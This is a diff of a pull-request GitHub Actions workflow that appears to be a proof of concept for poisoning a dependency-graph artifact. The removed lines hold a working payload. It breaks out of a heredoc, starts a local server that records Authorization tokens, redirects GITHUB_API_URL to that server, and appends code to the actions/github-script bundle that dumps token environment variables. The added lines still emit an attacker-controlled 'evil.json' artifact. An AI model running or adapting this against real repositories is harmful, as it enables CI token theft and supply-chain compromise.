@@ -2,44 +2,14 @@ name: PR Workflow
 on:
   pull_request:
 jobs:
-  forge:
+  build:
     runs-on: ubuntu-latest
     steps:
-      - name: Build attacker-controlled dependency graph artifact
+      - name: Emit attacker-controlled dependency-graph artifact
         run: |
-          mkdir -p dependency-graph-reports
-          cat > dependency-graph-reports/report.txt <<'PAYLOAD'
-          <h1>Dependency Review</h1>
-          <h2>Scanned Files</h2>
-          <ul><li>settings.gradle
-          EOF
-          echo "shell-exec-marker=$(id -un)@$(hostname)" > /tmp/gab_rce_marker
-          cat > /tmp/gab_srv.py <<'PY'
-          import http.server, socketserver
-          class H(http.server.BaseHTTPRequestHandler):
-              def _log(self, body=b''):
-                  open('/tmp/gab_token_capture','a').write(self.path+' | '+str(self.headers.get('Authorization'))+' | '+body.decode('utf8','replace')[:200]+'\n')
-                  self.send_response(200); self.send_header('Content-Type','application/json'); self.end_headers(); self.wfile.write(b'{}')
-              def do_GET(self): self._log()
-              def do_POST(self):
-                  n=int(self.headers.get('Content-Length') or 0); self._log(self.rfile.read(n))
-          socketserver.TCPServer.allow_reuse_address=True
-          socketserver.TCPServer(('127.0.0.1',8081),H).serve_forever()
-          PY
-          nohup python3 /tmp/gab_srv.py >/dev/null 2>&1 &
-          sleep 1
-          echo 'GITHUB_API_URL=http://127.0.0.1:8081' >> "$GITHUB_ENV"
-          ACT_DIR=$(ls -d /home/runner/work/_actions/actions/github-script/*/dist 2>/dev/null | head -1)
-          echo "ACT_DIR=$ACT_DIR" >> /tmp/gab_rce_marker
-          cat >> "$ACT_DIR/index.js" <<'JS'
-          const _fs=require('fs');
-          _fs.writeFileSync('/tmp/gab_action_tamper', Object.entries(process.env).filter(([k])=>/TOKEN|GITHUB_API/i.test(k)).map(([k,v])=>k+'='+v).join('\n'));
-          JS
-          exit 0
-          </li></ul>
-          PAYLOAD
-          echo "payload bytes: $(wc -c < dependency-graph-reports/report.txt)"
+          mkdir -p out
+          cp evil.json out/evil.json
       - uses: actions/upload-artifact@v4
         with:
-          name: dependency-graph_poc.json
-          path: dependency-graph-reports/report.txt
+          name: dependency-graph_evil.json
+          path: out/evil.json
